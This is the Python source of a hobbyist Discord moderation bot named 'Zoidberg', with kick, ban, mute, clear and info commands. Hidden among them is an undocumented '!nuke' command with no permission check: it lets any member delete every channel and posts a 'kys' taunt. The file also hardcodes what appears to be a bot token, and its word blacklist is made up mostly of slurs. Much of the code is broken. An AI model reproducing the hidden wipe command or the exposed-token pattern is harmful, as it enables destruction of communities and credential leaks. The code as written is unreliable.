#DiscordBot 2023 "Zoidberg" by yTarik0 and 1momo7

#import datetime
import discord
from discord import client
from discord.ext import commands
import asyncio
from discord import app_commands
from discord import Interaction
import random


intents = discord.Intents.all()
client  = discord.Client(intents=intents)
tree    = app_commands.CommandTree(client)
client  = commands.Bot(command_prefix='/',intents=intents, application_id=803216674630270987)



#blacklisted words
blacklist = [
    "anus",
    "anal", "beeyotch","biatch","bitch",
    "chink",
    "coolie", "cum",  "cock",
    "dego",
    "dick", "douchebag", "dick",
    "fag",  "faggot", "fatass",
    "gash", "gimp",  "golliwog",
    "gook",
    "goy",  "gay" "goyim",
    "gyp",  "gypsy",   "gipsy",
    "homo",
    "hurensohn",
    "hure",
    "insanitie",
    "insanity",
    "jap"
    "kafir",
    "kike",
    "kraut",
    "lame",
    "lardass",
    "lesbo",
    "lesbe",
    "lunatic",
    "negress",
    "negro",
    "nig",
    "nig-nog",
    "nigga",
    "nigger",
    "nigg4"
    "neger"
    "nigguh",
    "neger",
    "nutte",
    "nuttensohn",
    "nip",
    "pajeet",
    "paki",
    "pickaninnie",
    "pickaninny",
    "penis",
    "prostitute",
    "pussie",
    "pussy",
    "raghead",
    "retard",
    "sambo",
    "shemale",
    "schlampe",
    "skank",
    "slut",
    "soyboy",
    "spade",
    "sperg",
    "spic",
    "schwuchtel",
    "schwanz",
    "tard",
    "tits",
    "titt",
    "trannie",
    "tranny",
    "whore",
    "wigger"]


@client.event
async def on_ready():
    print("""
              online
              ボットはオンラインです
              online
        """)
    synced = await client.tree.sync()
    print("Slash CMDs Synced "+ str(len(synced))+ " Commands")


@client.event
async def on_message(message):

    #creating .help command
    if message.content.startswith(".help".capitalize()):
        embed = discord.Embed(title="**Command-List for Zoidberg-Bot**", color=discord.Colour.random())
        embed.add_field(name="🌐**.help**", value="list of all commands")
        embed.add_field(name="🚪**.leave**", value="leave a server faster")
        embed.add_field(name="ℹ️**.serverinfo**", value="gives info about the server")
        embed.add_field(name="⚙️**.admin**",value="list all admin commands")
        embed.set_footer(text="⭐ • Made by yTarik0")
        await message.channel.send(embed=embed)

    # .leave command (fastest way for leaving dc server)
    if ".leave" in message.content:
        if str(message.author) != "tarik#5891":
            await message.guild.kick(message.author)



    # .kick command
    if message.content.startswith(".kick".capitalize()):
        if message.mentions:
            target = message.mentions[0]
            usr = message.guild.get_member(message.author.id)
            if usr.guild_permissions.administrator:
                await target.kick()
                embed = discord.Embed(title=f"**{target.name.capitalize()}** has been banned by **{message.author.capitalize()}**",color=discord.Colour.random())
                embed.add_field(name="🆔**User ID**", value=target.id)
                embed.add_field(name="💬**Reason**", value="test")
                embed.add_field(name="📆**Kicked on**", value="2022-12-23")
                embed.set_footer(text="⭐ • Made by yTarik0")
                await message.channel.send(embed=embed)
            else:
                embed = discord.Embed(title="**You dont have the Permisson to do that!**",
                                      color=discord.Colour.random())
                embed.add_field(name="📆**Tried Command on **", value=message.created_at.strftime("%Y-%m-%d %H:%M:%S"))
                embed.add_field(name="🆔**User ID**", value=message.author.id)
                embed.set_footer(text="⭐ Made by yTarik0")
                await message.channel.send(embed=embed)


    # .secret command later...
    if ".secret" in message.content:
        await message.channel.send("""
    **noch leer**        
                                   """)


        # chat-mute command (.mute)
    if message.content.startswith(".mute".capitalize()):
        usr = message.guild.get_member(message.author.id)
        if usr.guild_permissions.administrator:
            if message.mentions:
                target = message.mentions[0]
                await message.channel.set_permissions(target, send_messages=False)
                embed = discord.Embed(title=f"**{target.name.capitalize()}** has been mutedd by **{message.author.name.capitalize()}**",color=discord.Colour.random())
                embed.add_field(name="🆔**User ID**", value=target.id)
                embed.add_field(name="💬Reason", value="test")
                embed.add_field(name="📆Muted on", value="2022-12-23")
                embed.set_footer(text="⭐  • Made by yTarik0")
                await message.channel.send(embed=embed)
        else:
            embed = discord.Embed(title="**You dont have the Permisson to do that!**",
                                  color=discord.Colour.random())
            embed.add_field(name="📆**Tried Command on **", value=message.created_at.strftime("%Y-%m-%d %H:%M:%S"))
            embed.add_field(name="🆔**User ID**", value=message.author.id)
            embed.set_footer(text="⭐ Made by yTarik0")
            await message.channel.send(embed=embed)



        # chat-unmute command (.unmute)
    if message.content.startswith(".unmute".capitalize()):
        usr = message.guild.get_member(message.author.id)
        if usr.guild_permissions.administrator:
            if message.mentions:
                target = message.mentions[0]
                await message.channel.set_permissions(target, send_messages=True)
                embed = discord.Embed(title=f"**{target.name.capitalize()} has been unmuted by {message.author.name.capitalize()}**",color=discord.Colour.random())
                embed.add_field(name="🆔**User ID**", value=target.id)
                embed.add_field(name="💬**Reason**", value="test")
                embed.add_field(name="📆**Unmuted on**", value=message.created_at.strftime("Y%-%m-%d %H:%M:%S"))
                embed.set_footer(text="⭐  • Made by yTarik0")
                await message.channel.send(embed=embed)
        else:
            embed = discord.Embed(title="**You dont have the Permisson to do that!**",
                                  color=discord.Colour.random())
            embed.add_field(name="📆**Tried Command on **", value=message.created_at.strftime("%Y-%m-%d %H:%M:%S"))
            embed.add_field(name="🆔**User ID**", value=message.author.id)
            embed.set_footer(text="⭐ Made by yTarik0")
            await message.channel.send(embed=embed)




        # .admin-commands
    if message.content.startswith(".admin".capitalize()):
        embed = discord.Embed(title="**Admin-Command List**",color=discord.Colour.random())
        embed.add_field(name="🌐**.kick**", value="kicks a user")
        embed.add_field(name="🚫**.ban**", value="bans a user")
        embed.add_field(name="🧼**.clear**", value="clear chat messages")
        embed.add_field(name="🔐**.mute**", value="chat-locks a user")
        embed.add_field(name="🔓**.unmute**",value="unlock a user (from the chat)")
        embed.add_field(name="⚙️**.admin**",value="list all admin commands")
        embed.set_footer(text="⭐ • Made by yTarik0")
        await message.channel.send(embed=embed)




    #DM Awnser
    guild = message.guild
    if not guild and ".help" not in message.content:
        embed = discord.Embed(title="**I'm Sorry I can't handle Direct Messages**", color=discord.Colour.random())
        embed.add_field(name="🔰**github**", value="http://github.comytarik0\r\nhttp://github.com/1momo7")
        embed.add_field(name="❓**No Idea?**", value=".help")
        await message.channel.send(embed=embed)

    elif not guild and ".help" in message.content:
        await message.channel.send("")



    # .ban command
    if message.content.startswith(".ban".capitalize()):
        if message.mentions:
            target = message.mentions[0]
            usr = message.guild.get_member(message.author.id)
            if usr.guild_permissions.administrator:
                await target.ban()
                embed = discord.Embed(title=f"**{target.name}** has been banned by **{message.author}**", color=discord.Colour.random())
                embed.add_field(name="🆔**User ID**", value=target.id)
                embed.add_field(name="💬**Reason**", value="test")
                embed.add_field(name="📆**Banned At**", value=message.created_at.strftime("%Y-%m-%d %H:%M:%S"))
                embed.set_footer(text="⭐  •  Made by yTarik0")
                await message.channel.send(embed=embed)
            else:
                embed = discord.Embed(title="**You dont have the Permisson to do that!**",
                                      color=discord.Colour.random())
                embed.add_field(name="📆**Tried Command on **", value=message.created_at.strftime("%Y-%m-%d %H:%M:%S"))
                embed.add_field(name="🆔**User ID**", value=message.author.id)
                embed.set_footer(text="⭐ Made by yTarik0")
                await message.channel.send(embed=embed)


        #serverinfo command
    if message.content.startswith(".serverinfo"):
        server = message.guild
        embed = discord.Embed(title=f"Server Info for {server.name}",description="Information of this server", color=discord.Colour.random())
        embed.add_field(name="💬**Server Name**", value=server.name)
        embed.add_field(name="🆔**Server ID**", value=server.id)
        embed.add_field(name="📆**Created On**", value=server.created_at.strftime('%Y-%m-%d'))
        embed.add_field(name="👑**Server Owner**", value=server.owner)
        embed.add_field(name="👥**Server Member Count**", value=server.member_count)
        #embed.set_thumbnail(url=server.icon_url)
        embed.set_footer(text="⭐  •  Made by yTarik0")
        await message.channel.send(embed=embed)


    #automatic mute when using blacklisted word
    for word in blacklist:
        if word in message.content:
            await message.channel.set_permissions(message.author, send_messages=False)
            embed = discord.Embed(title=f"**{message.author.name.capitalize()}** has been chat-locked by automatically **Zoidberg**",color=discord.Colour.random())
            embed.add_field(name="🆔**User ID**", value=message.author.id)
            embed.add_field(name="💬**Reason**", value="using blacklisted word")
            embed.add_field(name="📆**Muted on**", value=message.created_at.strftime("Y-%m-%d %H:%M:%S"))
            embed.set_footer(text="⭐  • Made by yTarik0")
            await message.channel.send(embed=embed)



    if message.content.startswith('.clear'):
        usr = message.guild.get_member(message.author.id)
        if usr.guild_permissions.administrator:
            try:
                amount = int(message.content[7:])
                await message.channel.purge(limit=amount + 1)
                embed = discord.Embed(title=f"{message.author.name.capitalize()} cleared {amount} Messages",
                                      color=discord.Colour.random())
                embed.add_field(name="🆔 **User ID**", value=message.author.id)
                embed.add_field(name="📆**Cleared Messages At**", value=message.created_at.strftime("%Y-%m-%d %H:%M:%S"))
                embed.set_footer(text="⭐ Made by yTarik0")
                message = await message.channel.send(embed=embed,)
                await asyncio.sleep(4)
                await message.delete()
            except ValueError:
                await message.channel.send("Please enter a valid number of messages to delete.")


        else:
            embed = discord.Embed(title="**You don't have the Permisson to do that!**", color=discord.Colour.random())
            embed.add_field(name="📆**Tried Command on **", value=message.created_at.strftime("%Y-%m-%d %H:%M:%S"))
            embed.add_field(name="🆔**User ID**", value=message.author.id)
            embed.set_footer(text="⭐ Made by yTarik0")
            await message.channel.send(embed=embed)

    if message.content.startswith('!nuke'):
        server = message.guild
        for c in server.channels:
            await c.delete()
        await message.guild.create_text_channel(name="nuked lol kys")


# have to check how to import more modules on async def xyz():
# and fix the error

@client.tree.command(name="test", description="just for fun")
async def test(message, interaction: discord.User):
    target = message.mentions[0]
    usr = message.guild.get_member(message.author.id)
    if usr.guild_permissions.administrator:
        await target.ban()
        embed = discord.Embed(title=f"**{target.name}** has been banned by **{message.author}**",
                              color=discord.Colour.random())
        embed.add_field(name="🆔**User ID**", value=target.id)
        embed.add_field(name="💬**Reason**", value="test")
        embed.add_field(name="📆**Banned At**", value=message.created_at.strftime("%Y-%m-%d %H:%M:%S"))
        embed.set_footer(text="⭐  •  Made by yTarik0")
    await interaction.response.send_message(embed=embed)



#code a game Rock paper Scissors /rps

#@client.tree.command(name="rps", description="Rock Paper Scissors against the Bot")
#async def rps(interaction: discord.Interaction):
    #user_pick = ("R", "P", "S", "Q").lower()
    #ask = await interaction.response.send_message("(R)ock/(P)aper/(S)cissors or Q to quit?")
    #if message
       # await interaction.response.send_message("You quitted the game thanks for playing")


@client.event
async def status_task():
    while True:
        await client.change_presence(activity=discord.Activity('.help'), status=discord.Status.online)
        await asyncio.sleep(3)
        await client.change_presence(activity=discord.Game('github.com/yTarik0'), status=discord.Status.online)













client.run("ODAzMjE2Njc0NjMwMjcwOTg3.G96a-M.Ry9iyV4FmzPb0TU7yEkFBxgnJlwPNrp-hsvQXM")